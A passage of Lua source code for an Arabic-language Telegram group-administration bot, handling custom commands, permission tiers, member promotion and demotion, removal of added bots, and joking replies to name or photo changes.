Dev_Abs(msg.chat_id_, msg.id_, 1, "⛔️❗️ لايوجد ٱمـر بِهـذٱ  ٱلٱســم", 1, 'html')
end
DevAbs:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if data.message_.content_.text_ then
local NewCmmd = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
-------------
if text and DevAbs:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevAbs:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل ٱلٱمـر ٱڵـجديـد", 1, 'html')
DevAbs:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevAbs:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevAbs:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevAbs:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevAbs:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ تـم حُـفِـظ ٱلٱمـر", 1, 'html')
DevAbs:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end


if text == "الاوامر المضافه" then
local list = DevAbs:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."")
t = "🌍- اهلا بك في قائمة الاوامر المضافه \n🌍- Welcoome to list of orders added\n〰️➖〰️➖〰️➖〰️➖〰️\n"for k,v in pairs(list) do
Cmds = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."- ("..v..") ~ {"..Cmds.."}\n"
else
t = t..""..k.."- ("..v..") \n"
end
end

if #list == 0 then
t = "⛔️❗️ لايوجد ٱوٱمـر مُـضافة فيۧ ٱڵمجـمۄعة"
end

Dev_Abs(msg.chat_id_, msg.id_, 1, "["..t.."]", 1, 'md')
end

if text == "حذف الاوامر المضافه" or text == "حذف الاوامر المضافه" then
local list = DevAbs:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
DevAbs:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevAbs:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
end

Dev_Abs(msg.chat_id_, msg.id_, 1, "⛔️❗️ تـۖم حـذف ٱلٱوامـر ٱڵـمُـضافة فيۧ ٱڵـمجـمۄعة", 1, 'html')
end

if text == "اضف امر" then
DevAbs:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل ٱلٱمـر ٱڵـقديم", 1, 'html')
return false
end

if text == "حذف امر" or text == "حذف امر" then 
DevAbs:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل ٱلٱمـر ٱڵـذي قُـمتَ بٱضافتـة يدويـاً", 1, 'html')
return false
end


if text == "الصلاحيات" then 
local list = DevAbs:smembers(bot_id.."Coomds"..msg.chat_id_)
if #list == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⛔️❗️ لايوجد صلاحيات مُـضافة فيۧ ٱڵمجـمۄعة", 1, 'html')
return false
end

t = "🌍- اهلا بك في قائمة الصلاحيات المضافه \n🌍- Welcome to the list of added powers\n〰️➖〰️➖〰️➖〰️➖〰️\n"for k,v in pairs(list) do
var = DevAbs:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."- "..v.." ~ ("..var..")\n"
else
t = t..""..k.."- "..v.."\n"
end
end

Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end

if text == "حذف الصلاحيات" then
local list = DevAbs:smembers(bot_id.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
DevAbs:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
DevAbs:del(bot_id.."Coomds"..msg.chat_id_)
end

Dev_Abs(msg.chat_id_, msg.id_, 1, "⛔️❗️ تـۖم حـذف ٱلصلاحيات ٱڵـمُـضافة فيۧ ٱڵـمجـمۄعة", 1, 'html')
end

if text and text:match("^اضف صلاحيه (.*)$") then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevAbs:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevAbs:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
DevAbs:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل نـوع ٱڵـصلاحيه \n{ عضو • مميز  • ادمن  • مدير }", 1, 'html') 
end

if text and text:match("^حذف صلاحيه (.*)$") or text and text:match("^حذف صلاحيه (.*)$") then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
DevAbs:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ تـم حُـفِـظ ٱلصلاحيه", 1, 'html')
end
if DevAbs:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ تـم ٱڵـغاء ٱلٱمـر", 1, 'html')
DevAbs:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل نـوع ٱڵـصلاحيه \n👁‍🗨❕ يمكنك ٱضافـة صلاحية مِـثـل :\n { عضو • مميز  • ادمن }", 1, 'html')
return false
end
end
if text == "ادمن" then
if not is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل نـوع ٱڵـصلاحيه \n👁‍🗨❕ يمكنك ٱضافـة صلاحية مِـثـل :\n { عضو • مميز }", 1, 'html')
return false
end
end
if text == "مميز" then
if not is_momod(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ ٱرسِـل نـوع ٱڵـصلاحيه \n👁‍🗨❕ يمكنك ٱضافـة صلاحية مِـثـل :\n { عضو }", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevAbs:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevAbs:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "️☻ تـم ٱضافة ٱلٱمـر", 1, 'html')
DevAbs:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DevProxrt = text:match("رفع (.*)")
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,DevProxrt) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local fdrt = DevAbs:get(bot_id.."Comd:New:rt:bot:"..DevProxrt..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..data.first_name_..'](t.me/'..(data.username_ or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم ترقيتة من قائمة ٲلمميزين في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DevProxrt) 
DevAbs:sadd(DevProx..'bot:VipGroup:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..data.first_name_..'](t.me/'..(data.username_ or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم ترقيتة من قائمة ٲلأدمنية في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DevProxrt)
DevAbs:sadd(DevProx..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..data.first_name_..'](t.me/'..(data.username_ or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم ترقيتة من قائمة ٲلمدراء في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DevProxrt)  
DevAbs:sadd(DevProx..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..data.first_name_..'](t.me/'..(data.username_ or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم ترقيتة من قائمة ٲلأعضاء في ٱڵمجـمۄعة.', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 

local DevProxrt = text:match("تنزيل (.*)")
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,DevProxrt) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local fdrt = DevAbs:get(bot_id.."Comd:New:rt:bot:"..DevProxrt..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..data.first_name_..'](t.me/'..(data.username_ or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي :  '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم تنزيلة من قائمة ٲلمميزين في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:srem(DevProx..'bot:VipGroup:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..data.first_name_..'](t.me/'..(data.username_ or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي :  '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم تنزيلة من قائمة ٲلأدمنية في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:srem(DevProx..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..data.first_name_..'](t.me/'..(data.username_ or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي :  '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم تنزيلة من قائمة ٲلمدراء في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:srem(DevProx..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..data.first_name_..'](t.me/'..(data.username_ or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي :  '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم تنزيلة من قائمة ٲلأعضاء في ٱڵمجـمۄعة.', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 

local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local fdrt = DevAbs:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..result.title_..'](t.me/'..(text1[3] or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم ترقيتة من قائمة ٲلمميزين في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:sadd(DevProx..'bot:VipGroup:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..result.title_..'](t.me/'..(text1[3] or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم ترقيتة من قائمة ٲلأدمنية في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:sadd(DevProx..'bot:momod:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..result.title_..'](t.me/'..(text1[3] or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم ترقيتة من قائمة ٲلمدراء في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:sadd(DevProx..'bot:owners:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..result.title_..'](t.me/'..(text1[3] or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم ترقيتة من قائمة ٲلأعضاء في ٱڵمجـمۄعة.', 1, 'md')
end
else
info = "⛔️❗️ ٱڵـمعرف غـيـر صـحـيـح"
Dev_Abs(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 

local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local fdrt = DevAbs:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..result.title_..'](t.me/'..(text1[3] or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم تنزيلة من قائمة ٲلمميزين في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:srem(DevProx..'bot:VipGroup:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..result.title_..'](t.me/'..(text1[3] or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم تنزيلة من قائمة ٲلأدمنية في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:srem(DevProx..'bot:momod:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..result.title_..'](t.me/'..(text1[3] or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم تنزيلة من قائمة ٲلمدراء في ٱڵمجـمۄعة.', 1, 'md')
DevAbs:srem(DevProx..'bot:owners:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🙎🏻‍♂️ • ٱڵـمُعرف : ['..result.title_..'](t.me/'..(text1[3] or 'DEV_PROX')..')'..' \n🕵🏻‍♂️ • ٱلٱيـدي : '..result.sender_user_id_..' \n👨🏻‍🔧 • بوٱسطِـة : '..renk_DevProx(msg)..' \n⚜️• تـۖم تنزيلة من قائمة ٲلأعضاء في ٱڵمجـمۄعة.', 1, 'md')
end
else
info = "⛔️❗️ ٱڵـمعرف غـيـر صـحـيـح"
Dev_Abs(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end


DevAbs:sadd(DevProx.."groups:users" .. msg.chat_id_, msg.sender_user_id_)--save users gp
DevAbs:incr(DevProx.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")--save msgs gp
if msg.content_.ID == "MessageChatDeleteMember" then
if tonumber(msg.content_.user_.id_) == tonumber(bot_id) then
DevAbs:del(DevProx.."bot:enable:" .. msg.chat_id_)
DevAbs:srem(DevProx.."bot:groups", msg.chat_id_) 
end end 
function chek_admin(chat_id,set) 
local function promote_admin(extra,result,success)   
limit = result.administrator_count_   
if tonumber(limit) > 0 then 
getChannelMembers(chat_id, 0, 'Administrators', limit,set)   
end
end
getChannelFull(chat_id,promote_admin)
end
function channel_get_kicked(channel,cb)
local function callback_admins(extra,result,success)
limit = result.kicked_count_
getChannelMembers(channel, 0, 'Kicked', limit,cb)
end
getChannelFull(channel,callback_admins)
end
function deleteMessagesFromUser(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_ids, -- vector
disable_notification_ = disable_notification,
from_background_ = 1
}, dl_cb, nil)
end
function getUser(user_id, cb)
    tdcli_function ({
  ID = "GetUser",
  user_id_ = user_id
    }, cb, nil)
  end
local msg = data.message_
text = msg.content_.text_
if text then 
function DevProx(extra,result,success)
if result.id_ then 
local abs = DevAbs:get("DevProx:name"..result.id_)
if not result.first_name_ then 
if abs then 
DevAbs:del("DevProx:name"..result.id_) 
end
end
if result.first_name_ then 
if abs and abs ~= result.first_name_ then 
local DevProx_text = {
  "اسمك الجديد { "..result.first_name_.." }\n ليش غيرته 🌚😹",
  "اسمك الجديد { "..result.first_name_.." }\n مو حلو رجعه القديم ☹️👌",
  "ليش غيرت اسمك { "..result.first_name_.." }\n قطيت احد حبي ؟ 🌚😹",
  "اسمك الجديد يخبل ضلعي 🤭😹{ "..result.first_name_.." }", 
}
absx = math.random(#DevProx_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx_text[absx], 1, 'html')
end  
DevAbs:set("DevProx:name"..result.id_, result.first_name_)  
end
end
end
getUser(msg.sender_user_id_, DevProx)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(DevProx.."bot:bots:ban" .. msg.chat_id_) and not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(DevProx.."bot:bots:mute" .. msg.chat_id_) and not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(DevProx.."keed_bots"..msg.chat_id_)  and not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
DevAbs:sadd(DevProx..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevAbs:sadd(DevProx..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(DevProx) then 
DevAbs:srem("DevProx:addg"..bot_id, msg.chat_id_) 
DevAbs:del(DevProx.."bot:charge:"..msg.chat_id_)
function DevProx(extra,result,success) 
function  reslit(A1,A2)
function dl_cb222(t1,t2)
tdcli_function ({ ID = "GetChat", chat_id_ = bot_owner },function(arg,chat)  
Dev_Abs(tostring((DevAbs:get(DevProx.."bot:leader:gr") or bot_owner)), 0, 1, "🏆┇ تم طرد البوت من مجموعه  \n📤┇ ايدي العضو ~ {"..msg.sender_user_id_.."}\n🚸┇ معرف العضو ~ @"..(result.username_ or "لا يوجد").."\n📥┇ معلومات المجموعه  \n\n📂┇ ايدي المجموعه ~ {"..msg.chat_id_.."}\n🛢┇ اسم المجموعه  {"..A2.title_.."}\n☑️┇ { تم حذف جميع بياناتها }" , 1, 'html')
end,nil)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
tdcli_function ({
ID = "GetChat",
chat_id_ = msg.chat_id_
}, reslit, nil) 
end
getUser(msg.sender_user_id_, DevProx)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)    
end   
end
local msg = data.message_
text = msg.content_.text_
if text then 
function DevProx(extra,result,success)
if result.id_ then 
local abs = DevAbs:get("DevProx:Userr"..result.id_)
if not result.username_ then 
if abs then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه : @"..abs, 1, 'html')
DevAbs:del("DevProx:Userr"..result.id_) 
end
end
if result.username_ then 
if abs and abs ~= result.username_ then 
local DevProx_text = {
  'كمشتك ليش غيرت معرفك ولك 😹',
  "ليش غيرت معرف طشوك بقنات انحراف ؟ ⛷😹",
  "حلو معرفك الجديد منين خمطته 😹",
  "لحكو غير معرفه خمطو \n هذا معرفه القديم 🌚😹 @"..result.username_.."",
}
absx = math.random(#DevProx_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx_text[absx], 1, 'html')
end  
DevAbs:set("DevProx:Userr"..result.id_, result.username_) 
end
end
end
getUser(msg.sender_user_id_, DevProx)
end
local msg = data.message_
text = msg.content_.text_
if text then 
function abs(extra,result,success)
if result.id_ then 
local abs2 = DevAbs:get("abs:photo"..result.id_)
if not result.profile_photo_ then 
if abs2 then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "حذف كل صوره الحلو 😂👌🏻", 1, 'html')
DevAbs:del("abs:photo"..result.id_) 
end
end
if result.profile_photo_ then 
if abs2 and abs2 ~= result.profile_photo_.big_.persistent_id_ then 
local abs_text = {
  "طالع صاك بالصوره الجديده ممكن نرتبط",
  "صوره فيطي الجديده غيرها",
  "صورتك الجديده فد شي 😑😹",
  "حطيت صورتي شوفوني اني صاك بنات 🙄😹",
}
abs3 = math.random(#abs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abs_text[abs3], 1, 'html')
end  
DevAbs:set("abs:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
end
end
end
getUser(msg.sender_user_id_, abs)
end
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil) 
end
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source DevProx     --
function string:split(sep)
local sep, fields = sep or ":", {}
local pattern = string.format("([^%s]+)", sep)
self:gsub(pattern, function(c) fields[#fields+1] = c end)
return fields
end
function faedr(msg,data) 
local msg = data.message_
local text = msg.content_.text_
local caption = msg.content_.caption_
if text ==('تفعيل') and not is_admin(msg.sender_user_id_, msg.chat_id_) and not DevAbs:get(DevProx..'lock:bot:free'..bot_id) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
DevAbs:sadd(DevProx..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
DevAbs:sadd(DevProx.."bot:monsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if DevAbs:get(DevProx.."bot:enable:"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '◥❗️☻ٱڵمجـمۄعة ،بٱڵتاكيد ،مۧفعڵـة◤', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱڵبـۄت فيۧ ٱڵمجـمۄعة \n 👨🏻‍🔧 • بوٱسطِـة : ['..result.title_..'](t.me/'..(text1[3] or 'DEV_PROX')..')'..' ', 1, 'md')
openChat(msg.chat_id_,DevProx)
DevAbs:sadd("DevProx:addg"..bot_id, msg.chat_id_)
function DevProx(A1,A2)
function dl_cb222(t1,t2)
